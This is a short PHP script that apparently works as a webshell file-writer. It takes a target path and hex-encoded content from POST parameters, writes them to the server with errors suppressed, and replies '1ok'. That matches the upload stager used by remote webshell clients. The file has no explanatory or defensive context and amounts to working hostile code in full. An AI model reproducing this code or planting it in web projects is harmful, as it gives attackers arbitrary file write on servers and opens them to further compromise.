<?php
$f = realpath(dirname(__FILE__) . "/../") . $_POST["z1"];
$c = $_POST["z2"];
$buf = "";
for ($i = 0; $i < strlen($c); $i+= 2) $buf.= urldecode("%" . substr($c, $i, 2));
@fwrite(fopen($f, "w") , $buf);
echo "1ok";
?>